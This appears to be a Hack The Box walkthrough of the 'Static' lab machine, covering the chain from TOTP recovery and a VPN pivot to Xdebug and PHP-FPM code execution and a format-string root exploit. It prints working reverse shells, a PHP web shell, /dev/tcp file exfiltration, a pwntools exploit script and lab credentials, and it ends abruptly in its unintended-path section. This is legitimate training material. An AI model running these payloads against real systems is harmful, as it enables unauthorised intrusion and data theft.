@@ -1,0 +1,641 @@
+                          Static
+
+                          14th Dec 2021 / Document No D21.100.146
+                          Prepared By: TRX
+                          Machine Author(s): ompamo
+                          Difficulty: Hard
+
+Classification: Official
+
+Synopsis
+
+Static is a hard difficulty machine that features a web server running on port 8080. The website features a
+login page that can be easily bypassed by using default credentials, however, further access to the
+administrative panel is obstructed by a 2FA prompt. A corrupt Gzip archive is also identified on the website
+and after downloading it, its contents can be recovered. The archive holds a database backup that contains
+the OTP code for the administrative user. Once the OTP code is identified, further enumeration reveals an
+NTP server also running on the host. With the above information at hand, a script is created to generate a
+2FA code and login to the administrative panel. The administrative panel can be used to generate a VPN
+configuration, which in turn can be used to access the internal networking of the remote host. By altering
+the routing, a new host is identified, which is also running a web server. This server is running Xdebug with
+remote mode enabled and can be abused to execute commands. After a shell as www-data is acquired
+another internal network is discovered with two more hosts. One of them is responsible for the generation
+of the VPN configuration files and does so through the usage of an Nginx installation with PHP-FPM. This
+installation is found to be vulnerable to a Remote Code Execution exploit, successful exploitation of which
+leads to a shell on the pki system. Privilege escalation can be achieved by exploiting a Format String
+vulnerability in the binary that is responsible for the VPN file generation.
+
+Skills Required
+
+      Enumeration
+      Web Exploitation
+      TOTP Generation
+      Pivoting Skills
+      VPN Usage & Alteration Skills
+      Basic Binary Exploitation Skills
+
+Skills Learned
+
+      Decompression Troubleshooting
+      Multiple Server Pivoting
+      Configuring Routes for VPNs
+      Exploiting phuip-fpizdam
+      PHP X-DEBUG Exploitation
+      Format String Attack Exploitation
+
+Enumeration
+
+Nmap
+
+   nmap -sC -sV -Pn -v 10.10.10.246 -p-
+The Nmap scan reveals ports 22 (SSH), 2222 (SSH) and 8080 (Apache Server) to be open. Let's start with port
+8080.
+
+   curl -v 10.10.10.246:8080
+The Apache server is returning headers to us upon connecting, however, the page does not have any
+content. Let's run a GoBuster scan to see if there are any other files or folders available.
+
+   gobuster dir -u http://10.10.10.246:8080 -w /usr/share/wordlists/dirb/common.txt
+GoBuster reveals that robots.txt exists. Let's check it out using cURL.
+   curl http://10.10.10.246:8080/robots.txt
+
+The robots file contains two disallowed entries, /vpn/ and /.ftp_uploads/ . The /vpn/ folder directs us
+to a login page.
+Attempting to login using default credentials and specifically admin / admin is successful and access is
+granted.
+
+Upon successful login a prompt for two factor authentication is visible, however, we do not have an OTP
+code, so let's move on.
+Navigating to /.ftp_uploads/ reveals two listable files.
+warning.txt mentions that binary files are somehow being corrupted while transferring.
+
+   Binary files are being corrupted during transfer!!! Check if are recoverable.
+
+The other files seems to be a compressed database backup. After downloading it, attempts at
+decompressing it result in a CRC error.
+
+   gunzip db.sql.gz
+
+   gzip: db.sql.gz: invalid compressed data--crc error
+   gzip: db.sql.gz: invalid compressed data--length error
+
+This could be caused by incorrectly using ASCII mode instead of BINARY to transfer binary files from an FTP
+server. A quick Google search using the keywords recover gz files reveals this Github repository about
+a program that can be used to recover a corrupt gzip file. Clone it locally and install it.
+
+   git clone https://github.com/arenn/gzrt
+   make
+   sudo mv gzrecover /usr/local/bin/
+
+Execute it, providing the corrupt file as input.
+
+   /usr/local/bin/gzrecover db.sql.gz
+
+After running the above command, a file called db.sql.recovered is created in the same folder with the
+following contents.
+
+   CREATE DATABASE static;
+   USE static;
+   CREATE TABLE users ( id smallint unsignint a'n a)Co3 Nto_increment,sers name
+   varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary
+   key (idS iaA;
+   INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma,
+   prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
+   IN
+
+The output appears quite corrupt, however, various parts can be made out. The most interesting is the
+Time-Based One Time password in the last line d0orxxi4c7orxwwzlo , which could potentially be used for
+the 2FA field that was identified earlier.
+
+TOTP
+
+A TOTP is an algorithm that generates a one-time password that uses the current time as the source of
+uniqueness. There are plenty of libraries available online that we can use in order to acquire a one time
+password for the website, however we must first synchronise with the remote server time. Let's check if the
+server is also running a Network Time Protocol (NTP) server.
+An NTP server is indeed running and it is now possible to sync our local time with the server's time. Let's
+write a Python script to acquire TOTP codes with the pyotp library.
+First, install the required dependencies.
+
+   pip3 install pytotp
+   pip3 install ntplib
+
+Place the following code inside a file called totp.py .
+
+   #!/usr/bin/python3
+   import pyotp
+   import ntplib
+   from time import ctime
+
+   c = ntplib.NTPClient()
+   response = c.request('10.10.10.246')
+   print(ctime(response.tx_time))
+
+   totp = pyotp.TOTP('orxxi4c7orxwwzlo')
+   print(totp.at(response.tx_time))
+
+Finally execute it to acquire a code.
+
+   python3 totp.py
+   Tue Dec 14 18:55:15 2021
+   490120
+
+The code can be inputted in the 2FA form that was identified earlier in order to successfully login. After login
+the following page can be seen.
+The page mentions a Common Name and a few server addresses. It is unclear what the form does so let's
+attempt to input a name and click Generate.
+A VPN file is generated and prompted for download. Upon downloading and inspecting the file it seems that
+by using this configuration file, a connection will be made to vpn.static.htb .
+
+   client
+   dev tun9
+   proto udp
+   remote vpn.static.htb 1194
+
+Add this to your hosts file and use Openvpn to connect.
+
+   echo "10.10.10.246 vpn.static.htb" | sudo tee -a /etc/hosts
+   sudo openvpn trx.ovpn
+A connection is successfully opened and can be used to enumerate the internal network. Let's check the
+routes that were added by the VPN.
+
+There are two routes available on the tun9 interface. After scanning both networks using Nmap, no
+interesting servers seem to be online. The webpage found earlier made mention to the 172.20.0.0
+network, which hosted two servers. It is possible that this network is routable through the VPN. Let's add a
+corresponding route.
+
+   sudo route add -net 172.20.0.0/24 gw 172.30.0.1
+After the route is added, scan the network using Nmap.
+
+   nmap -A -v 172.20.0.0/24
+The scan reveals two hosts, 172.20.0.10 with ports 22 (SSH) and 80 (Apache), as well as 172.20.0.11 with
+port 3306 (MySQL). Let's check the first host on port 80.
+The index of the page reveals a file called info.php as well as a folder called vpn/ . The VPN folder directs
+us back to the login page. info.php however, prints out output from the phpinfo() function.
+
+Looking at the information page, we note that Xdebug v2.6.0 is in use. Xdebug is a PHP extension that can
+be used to debug PHP code. A quick Google search using the keywords xdebug exploitation reveals that
+if the Xdebug extension has been configured to allow remote connections, it is possible to execute
+commands on the target system. Let's check the information page to determine if this has been configured.
+This has been indeed configured and we can proceed with code execution. Some more Google research
+reveals this Github repository that can be used to exploit vulnerable configurations. Clone it locally in order
+to begin exploitation and install any required packages.
+
+   git clone https://github.com/gteissier/xdebug-shell
+   cd xdebug-shell
+   python2 -m pip install defusedxml
+Finally execute it as follows.
+   ./xdebug-shell.py --local-host=172.30.0.9 --url=http://172.20.0.10/info.php
+
+The user flag can be located in /home/user.txt .
+
+Lateral Movement
+
+Shell Upgrade
+
+Before we proceed let's upgrade our shell, as this one is very limited and crashes often depending on the
+user input. Let's create a bash payload and base64 encode it.
+
+   echo "bash -i >& /dev/tcp/172.30.0.9/1234 0>&1" | base64
+   YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzAuMC45LzEyMzQgMD4mMQo=
+Once the payload is created start a Netcat listener locally.
+   nc -lvp 1234
+Finally send the payload to the remote server.
+   echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzAuMC45LzEyMzQgMD4mMQo= | base64 -d | bash
+This is successful and a more stable shell is acquired.
+
+Enumeration
+
+Enumeration of the file system reveals a file called database.php located in /var/www/html/vpn/ .
+   <?php
+   $servername = "db";
+   $username = "root";
+   $password = "2108@C00l";
+   $dbname = "static";
+   ?>
+
+This file contains database credentials for the web application. The output from the netstat command
+however, does not show MySQL running on the system.
+
+The server name in the database file is called db , therefore lets try to ping this hostname to see if it is up.
+   ping -c 1 db
+The host is up and it's IP matches the one mentioned earlier in the web application.
+
+The file panel.php is used to generate the VPN configuration files. It connects to a host called pki and
+provides the Common Name ( cn ) variable through a POST request. The configuration is then generated by
+the pki host and sent back to us.
+
+   if(isset($_POST['cn'])){
+          $cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_POST['cn']);
+          header('Content-type: application/octet-stream');
+          header('Content-Disposition: attachment; filename="'.$cn.'.ovpn"');
+          $handle = curl_init();
+          $url = "http://pki/?cn=".$cn;
+          curl_setopt($handle, CURLOPT_URL, $url);
+          curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
+          $output = curl_exec($handle);
+          curl_close($handle);
+          echo $output;
+          die();
+
+   }
+
+Let's attempt to ping this host as well.
+This host is also up and the hostname is shown as pki.secret .
+In order to check for open ports on these hosts we can upload a static version of Nmap on the box. First
+download the binary locally and start a Python3 HTTP server.
+
+   python3 -m http.server 8000
+Then download the binary from the remote host.
+
+   wget 172.30.0.9:8000/nmap-static
+
+Finally make the binary executable and run it agains the two known hosts.
+   chmod +x nmap-static
+   ./nmap-static pki
+   ./nmap-static db
+The scan reveals that the pki host has port 80 (Apache) open, while db has port 3306 (MySQL) open.
+
+Chisel
+
+In order to access the remote web server we can use Chisel to create a port forward on the web host and
+route traffic on that port to port 80 on pki .
+Let's start by downloading Chisel locally.
+
+   wget
+   https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
+   gunzip chisel_1.7.6_linux_amd64.gz
+   mv chisel_1.7.6_linux_amd64.gz chisel
+
+To download the binary from the remote host we can either use the already open Python HTTP server, or
+start a new one as shown previously.
+Download the binary and make it executable.
+   wget http://172.30.0.9:8000/chisel
+   chmod +x chisel
+
+Finally run the following command on the Web host.
+   ./chisel server --port 8000 --proxy http://192.168.254.3
+
+We can now navigate to http://172.20.0.10:8000 to access the Web server on pki , or use cURL.
+   curl -v http://172.20.0.10:8000
+
+The page responds with terminal like output, however, we also note the Nginx and PHP-FPM versions,
+1.14.0 and 7.1 respectively.
+
+Remote Code Execution
+Researching this specific PHP-FPM version we identify this buffer overflow vulnerability assigned CVE-2019-
+11043 that exists on versions 7.2.23 and bellow, when configured with Nginx . The configuration that is
+required for this vulnerability to be exploited is as follows.
+
+      The Nginx location directive must forward requests to PHP-FPM
+      The fastcgi_split_path_info directive must be present and include a regular expression beginning
+      with a ^ symbol and ending with a $ symbol
+      The fastcgi_param directive must be used to assign the PATH_INFO variable
+      There are no checks in place to determine whether or not a file exists (e.g. try_files )
+This is a common configuration for Nginx and when the exploit was released a lot of online servers where
+vulnerable.
+The article also provides an exploit to achieve Remote Code Execution on the vulnerable servers. Apart from
+the manual exploitation there seems to also exist a metasploit module for automatic exploitation. In this
+walkthrough we will make use of the manual exploitation.
+Download the exploit using Go .
+
+   go get github.com/neex/phuip-fpizdam
+   cd ~/go/bin/
+
+Then execute it as follows.
+
+   ./phuip-fpizdam http://172.20.0.10:8000/index.php
+
+The exploit appears to have successfully executed and suggests that command execution can be performed
+by appending ?a= to the URL followed by the command.
+cURL can be used to verify that commands are executed, however, the exploit depends on which Nginx
+worker processes the command, as only one of them is vulnerable. This means that if there are 4 workers,
+only one of them will execute the code and there is a possibility that we will have to refresh the page until
+we "hit" the correct worker.
+
+   curl http://172.20.0.10:8000/index.php/\?a\=id
+The command is successfully executed however the shell is very unstable. Let's upgrade to a normal PHP
+web shell.
+
+   curl http://172.20.0.10:8000/index.php/\?a\=ls\+\-la
+
+A directory listing of the current directory shows that there is folder called uploads where our current user
+has write privileges. Let's create a PHP file inside uploads with the following content.
+
+   <?php system($_GET['c']) ?>
+URL encode the above payload and send it as follows.
+
+   curl http://172.20.0.10:8000/index.php/\?a\='echo%20%27%3C\?php%20system\(\$_GET\
+   [%22c%22\]\)%20\?%3E%27%20%3E%20uploads/shell.php'
+The command needs to be sent a few times for the file to be created, but after a while the file will be visible
+inside the uploads folder.
+This shell is much more robust compared to the previous one and can be used to consistently execute
+commands.
+
+   curl http://172.20.0.10:8000/uploads/shell.php\?c\=id
+   uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+We also note that Python3 is installed on the system.
+
+   curl http://172.20.0.10:8000/uploads/shell.php\?c\=which\+python3
+   /usr/bin/python3
+
+Let's proceed to getting a reverse shell.
+
+Reverse Shell
+
+The pki host exists behind web , therefore it will not be able to successfully route a connection back to us.
+To this end we can use a static version of Socat on the web host, in order to setup a port forward that will
+send a connection back to our machine. First download Socat locally.
+
+   wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+
+Then start a Python3 HTTP server (or use the one that was already running).
+
+   python3 -m http.server 8000
+
+Download the binary from the web host and make it executable.
+
+   wget http://172.30.0.9:8000/socat
+   chmod +x socat
+Finally lets forward port 4444 to our own IP.
+   ./socat TCP-LISTEN:4444,fork TCP:172.30.0.9:4444 &
+
+After port forwarding has been established we can get a reverse shell with the following Python3 payload.
+   python3 -c 'import socket,pty,os;
+   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("web",4444));os.dup2(s.fi
+   leno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);os.putenv("TERM","xterm-
+   256color");os.putenv("SHELL","/bin/bash");pty.spawn("/bin/bash");'
+
+Start a Netcat listener on port 4444.
+   nc -lvp 4444
+
+Then URL encode the payload, enclose it inside single quotes and send it as follows.
+   curl http://172.20.0.10:8000/uploads/shell.php\?c\='python3%20-
+   c%20%27import%20socket%2Cpty%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK
+   _STREAM%29%3Bs.connect%28%28%22web%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B
+   %20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bos.putenv%28%
+   22TERM%22%2C%22xterm-
+   256color%22%29%3Bos.putenv%28%22SHELL%22%2C%22%2Fbin%2Fbash%22%29%3Bpty.spawn%28%22%2Fb
+   in%2Fbash%22%29%3B%27'
+
+A shell is successfully returned as www-data .
+
+Privilege Escalation
+
+Enumeration
+
+Enumeration of the web folder shows index.php with the following contents.
+   <?php
+   header('X-Powered-By: PHP-FPM/7.1');
+   //cn needs to be parsed!!!
+   $cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_GET['cn']);
+   echo passthru("/usr/bin/ersatool create ".$cn);
+   ?>
+
+Every time this page is loaded, it expects input from the cn variable and then executes a tool called
+ersatool in /usr/bin/ . Enumeration of this file shows that it does not have SUID rights enabled, however
+checking for linux capabilities shows that is has the setuid capability set.
+
+   getcap ersatool
+   ersatool = cap_setuid+eip
+
+It is worth checking for the source code of the binary using the find command. This can be done
+numerous different ways, however, the easiest is using a wildcard to list all suffixes.
+
+   find / -iname ersatool*
+
+   /usr/src/ersatool.c
+   /usr/bin/ersatool
+
+The source code is located in /usr/src/ersatool.c . Let's grab both the source code and the binary.
+Back to the web host, fire up Socat once more and forward port 5555 to your local machine.
+
+   ./socat TCP-LISTEN:5555,fork TCP:172.30.0.9:5555 &
+
+Start a Netcat listener on your machine on port 5555 to receive the files on.
+
+   nc -lvp 5555 > ersatool.c
+
+Finally /dev/tcp can be used to send the files from pki back to your local machine.
+
+   cat ersatool.c > /dev/tcp/192.168.254.2/5555
+
+The last two steps can be repeated to grab the binary as well.
+Let's check the protections that the binary has in place.
+
+   checksec ersatool
+Both NX and PIE are enabled, which means shell code cannot be inserted into the stack and addresses are
+randomised.
+Let's read the source code.
+
+   void printCN(char *cn, int i){
+   <SNIP>
+
+      do{
+          strncpy(fn, OUTPUT_DIR,sizeof(fn));
+          strncat(fn, "/",sizeof(fn)-strlen(fn));
+          strncat(fn, strtok(basename(buffer),"\n"),sizeof(fn)-strlen(fn));
+          strncat(fn, EXT, sizeof(fn)-strlen(fn));
+          printf(buffer); //checking buffer content
+          filePrint(fn);
+
+   </SNIP>
+
+The PrintCN function is interesting and specifically line 51, where the buffer is passed directly to printf
+without any string format specified. This is exploitable and can be abused to insert arbitrary addresses into
+the stack and write to them.
+Moving on to the CreateCN function, the ERSA_DIR variable, which has been set globally at the top of the
+program, is concatenated to EASYRSA and so is the string /easyrsa .
+
+   char ERSA_DIR[]="/opt/easyrsa";
+
+   <SNIP>
+   memset(EASYRSA,0,sizeof(EASYRSA));
+   strcat(EASYRSA,ERSA_DIR);
+   strcat(EASYRSA,"/easyrsa");
+   </SNIP>
+
+Then in line 114 a string array is created from the variables mentioned above as well as a few other strings.
+   char *a[] = {EASYRSA,"build-client-
+   full",strtok(basename(buffer),"\n"),"nopass","batch"};//forge the command string
+   cleanStr(a[2]);
+   sprintf(CMD,"%s %s %.20s %s %s",a[0],a[1],a[2],a[3],a[4]);
+
+Finally after the full command is placed inside a variable called CMD , the program escalates to root
+privileges, navigates to the ERSA_DIR , which is /opt/easyrsa and executes the command.
+
+   setuid(0); //escalating privilges to generate required files
+   chdir(ERSA_DIR);
+   system(CMD);
+   exit(0);
+
+From the above we can surmise that the program features a vulnerability that allows us to overwrite
+memory addresses, and a global variable that controls which program will be executed for the VPN
+generation. If we are able to alter the value of ERSA_DIR , it might be possible to execute malicious code
+with elevated privileges.
+
+Exploitation
+
+Now that we have understood the vulnerabilities lets create a Python script to exploit the binary.
+First of all, memory addresses can be dumped by abusing the format string vulnerability.
+
+The first five values popped look like pointers, but we can print out the respective string values. The first
+string looks like the value of the EXT global variable that has been initiated in the code.
+
+   //easyrsa configuration
+   char ERSA_DIR[]="/opt/easyrsa";
+   char TA_KEY[]="/opt/easyrsa/clients/ta.key";
+   char OUTPUT_DIR[]="/opt/easyrsa/clients";
+   char BASE_CONFIG[]="/opt/easyrsa/clients/base.conf";
+   char EXT[]=".ovpn";
+
+This variable is very close to the target ERSA_DIR so it might be possible to calculate the offset between
+those two. The iz command from radare2 can be used to calculate the offset.
+r2 ersatool
+
+With the offset calculated we can start building an exploit.
+
+from pwn import *
+
+p = remote('172.20.0.10', 2009)
+
+p.recv(64)            # read prompt
+p.sendline(b"print")  # Enter Menu
+p.recvuntil(b"CN=")
+
+We first grab the address of EXT variable.
+   p.sendline(b"%016p")
+   ext = p.recv(16)
+
+Then we calculate the address of ERSA_DIR based on the offset we found.
+
+   ersa_dir = int(ext,16) - 111
+
+   log.success(f"EXT Leaked Address: {ext.decode()}")
+   log.success(f"ERSA_DIR Address : 0x{ersa_dir:016x}")
+   log.success("Sending Payloads")
+
+Then we overwrite ERSA_DIR character by character using the format string.
+
+   # %10 = pointer
+   # $47 = ASCII for /
+   # p%10$n = stack address to overwrite
+
+   p.sendline("%10$47p%10$n".ljust(16, ".").encode() + p64(ersa_dir)) # /
+   p.recvuntil(b"\n\n")
+   p.sendline("%10$116p%10$n".ljust(16, ".").encode() + p64(ersa_dir+1)) # t
+   p.recvuntil(b"\n\n")
+   p.sendline("%10$109p%10$n".ljust(16, ".").encode() + p64(ersa_dir+2)) # m
+   p.recvuntil(b"\n\n")
+   p.sendline("%10$112p%10$n".ljust(16, ".").encode() + p64(ersa_dir+3)) # p
+   p.recvuntil(b"\n\n")
+   log.success("Payloads Sent")
+   p.sendline()
+
+Finally we trigger /tmp/ersatool by attempting to create a new OVPN key.
+
+   p.recvuntil(b"#")
+   p.sendline(b"create test")
+
+   p.interactive()
+
+Now that the exploit has been created we can proceed to testing it remotely.
+
+Accessing ersatool Remotely
+
+As pwntools are not installed on the remote system we will have to somehow make the binary accessible
+remotely. To this end, Socat can be used to run ersatool on a specific port so that it is accessible remotely.
+This host does not have any pre-installed tools that would help us download files on the system, however,
+since Python3 is installed we can use that to retrieve files.
+First things first, let's create another port forward on web so that we can grab files from our system.
+   ./socat TCP-LISTEN:8888,fork TCP:172.30.0.9:8888 &
+
+Then start a local Python3 HTTP server on your machine on port 8888.
+
+   python3 -m http.server 8888
+
+To grab socat, let's use python's urllib .
+
+   python3 -c 'import urllib.request;
+   urllib.request.urlretrieve("http://192.168.254.2:8888/socat","socat")'
+
+After it is downloaded, make it executable and run it.
+
+   chmod +x socat
+   ./socat TCP4-LISTEN:2000,reuseaddr,fork EXEC:/usr/bin/ersatool &
+
+The above command will bind ersatool on port 2000 on the pki host. To make it accessible from our
+local machine, a second Socat command can be used on the web host.
+
+   ./socat TCP-LISTEN:2000,fork TCP:192.168.254.3:2000 &
+
+Once that's done we can verify the connection using Netcat locally.
+
+   nc 172.20.0.10 2000
+   #
+   create|print|revoke|exit
+
+With the port forward in place we can proceed into executing the exploit.
+
+Root Shell
+
+First we will have to create a file called easyrsa in /tmp , which will be used to execute the code of our
+choice. Consider the following commands.
+
+   #!/bin/bash
+   cp /bin/bash /tmp/bash
+   chmod 4755 /tmp/bash
+
+The above commands will make a copy of /bin/bash inside the /tmp folder, give it setuid permissions
+and make it executable for everyone. This is simpler and more functional than getting a reverse shell, as
+that would need numerous more port forwards to be achieved.
+Place the above commands locally in a file called easyrsa and then use the already open Python3 HTTP
+server to download it from the remote host. Then make it executable.
+   python3 -c 'import urllib.request;
+   urllib.request.urlretrieve("http://192.168.254.2:8888/easyrsa","easyrsa")'
+   chmod +x /tmp/easyrsa
+Finally, from your local machine execute the previously created Python exploit for ersatool .
+   python3 exploit.py
+
+The exploit seems to have completed successfully and we can also verify if our payload ran by checking if
+bash exists inside /tmp .
+
+Bash has been successfully copied over and has SetUID permissions. To spawn a Root shell call it as follows.
+   /tmp/bash -p
+This successfully spawns a root shell and the root flag can be found in /root .
+
+Unintended Path
+
+To start with once we have a shell on the PKI server, we download pspy64s and send it to the target.
+The easiest way to do this is grab the SSH key of www-data on 192.168.254.2 and echo it into the PKI
+server 192.168.254.3 .
+
+Now we upload pspy64 from our attacker machine to 192.168.254.2 through the VPN IP.
+Locally:
+
+   wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+   python3 -m http.server 8081
+On the web server 192.168.254.2 we now get the pspy binary.
+   www-data@web:~$ wget 172.30.0.9/pspy64s -O /tmp/pspy64
+
+On the PK machine in the shell we already have we use SCP to transfer the file there.
+   www-data@pki:/tmp$ scp -i www 192.168.254.3:/tmp/pspy64s /tmp/pspy64s
+   www-data@pki:/tmp$ chmod +x pspy64s
+
+At this stage it's important to get a second shell so we can run pspy64s and monitor what happens when
+executing /usr/local/bin/ersatool .
+
+   curl http://172.20.0.10:8000/uploads/shell.php\?c\='python3%20-
+   c%20%27import%20socket%2Cpty%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK
+   _STREAM%29%3Bs.connect%28%28%22web%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B
+   %20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bos.putenv%28%
+   22TERM%22%2C%22xterm-
+   256color%22%29%3Bos.putenv%28%22SHELL%22%2C%22%2Fbin%2Fbash%22%29%3Bpty.spawn%28%22%2Fb
+   in%2Fbash%22%29%3B%27'
+Now in one of the shells we execute pspy64s and in the second shell we run /usr/bin/ersatool create
+exmaple .
+   ./pspy64s -pf -i 1000
+Since openssl is being used without a path, this leads to an unintended PATH hijacking scenario.
+Checking the permissions of /bin/bash we see that it is now an SUID executable
+
